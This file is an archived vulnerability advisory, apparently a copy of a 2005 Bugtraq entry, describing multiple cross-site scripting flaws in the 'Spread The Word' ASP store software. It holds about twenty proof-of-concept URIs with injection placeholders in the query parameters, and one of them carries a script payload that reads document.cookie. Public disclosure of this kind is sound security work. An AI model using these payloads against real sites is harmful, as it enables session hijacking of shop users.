@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid13733<p><b><span style="font-size: 18pt;">Spread The Word Multiple Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13733/info">info</a><br><a href="http://www.securityfocus.com/bid/13733/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13733/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13733/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13733/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13733
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 24 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 24 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Lostmon &lt;lostmon@gmail.com&gt; is credited with the discovery of these vulnerablities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Spread The Word Ministries Spread The Word  <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept URI are available:<br/>http://www.example.com/store/BrowseCategories.asp?Cat0=783&amp;Cat0Literal=Gifts&amp;Cat1=839&amp;Cat1Literal=BibleXSS-here<br/>http://www.example.com/store/BrowseCategories.asp?Cat0=783&amp;Cat0Literal=Gifts&amp;Cat1=839XSS-here&amp;Cat1Literal=Bible<br/>http://www.example.com/store/BrowseCategories.asp?Cat0=783&amp;Cat0Literal=GiftsXSS-here&amp;Cat1=839&amp;Cat1Literal=Bible<br/>http://www.example.com/store/BrowseCategories.asp?Cat0=783XSS-here&amp;Cat0Literal=Gifts&amp;Cat1=839&amp;Cat1Literal=Bible<br/>http://www.example.com/store/Search.asp?InStock=XSS-here&amp;SearchType=783&amp;strSearch=i&amp;SearchCat1=-1&amp;SearchCat2=-1&amp;PriceMin=&amp;PriceMax=&amp;PublicationDate=-1<br/>http://www.example.com/store/Search.asp?InStock=&amp;SearchType=783&amp;strSearch=XSS-here&amp;SearchCat1=-1&amp;SearchCat2=-1&amp;PriceMin=&amp;PriceMax=&amp;PublicationDate=-1<br/>http://www.example.com/store/Search.asp?InStock=&amp;SearchType=783&amp;strSearch=lol&amp;SearchCat1=-1XSS-here&amp;SearchCat2=-1&amp;PriceMin=&amp;PriceMax=&amp;PublicationDate=-1<br/>http://www.example.com/store/Search.asp?InStock=&amp;SearchType=783&amp;strSearch=lol&amp;SearchCat1=-1&amp;SearchCat2=-1XSS-here&amp;PriceMin=&amp;PriceMax=&amp;PublicationDate=-1<br/>http://www.example.com/store/Search.asp?InStock=&amp;SearchType=783&amp;strSearch=lol&amp;SearchCat1=-1&amp;SearchCat2=-1&amp;PriceMin=XSS-here&amp;PriceMax=&amp;PublicationDate=-1<br/>http://www.example.com/store/Search.asp?InStock=&amp;SearchType=783&amp;strSearch=lol&amp;SearchCat1=-1&amp;SearchCat2=-1&amp;PriceMin=&amp;PriceMax=XSS-here&amp;PublicationDate=-1<br/>http://www.example.com/store/AdvancedSearch.asp?strSearch=XSS-CODE&amp;SearchType=-1&amp;SearchCat1=-1&amp;SearchCat2=-1&amp;Author=dd&amp;PublicationDate=-1&amp;PriceMin=1&amp;PriceMax=11111111&amp;B1=Submit<br/>http://www.example.com/store/ViewItem.asp?ISBN=0789906651XSS-here&amp;Cat0=565<br/>http://www.example.com/store/ViewItem.asp?ISBN=0789906651&amp;Cat0=565XSS-here<br/>http://www.example.com/store/STWShowContent.asp?idRightPage=13032XSS-CODE<br/>http://www.example.com/store/MySide.Asp?Cat0=565&amp;Cat0Literal=BiblesXSS-CODE<br/>http://www.example.com/store/BrowseMain.asp?Cat0=565XSS-CODE&amp;Cat0Literal=Bibles&amp;CurHigh=4<br/>http://www.example.com/store/BrowseMain.asp?Cat0=565&amp;Cat0Literal=BiblesXSS-CODE&amp;CurHigh=4<br/>http://www.example.com/store/BrowseMain.asp?Cat0=783&amp;Cat0Literal=Gifts&amp;CurHigh=3"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/store/NewCustomer.asp?newemail=zzzz@lalala.es&amp;RedirectURL=XSS-CODE<br/>http://www.example.com/store/Login.asp?RedirectURL=XSS-code
+	
+		<ul>
+</ul>
+</div>
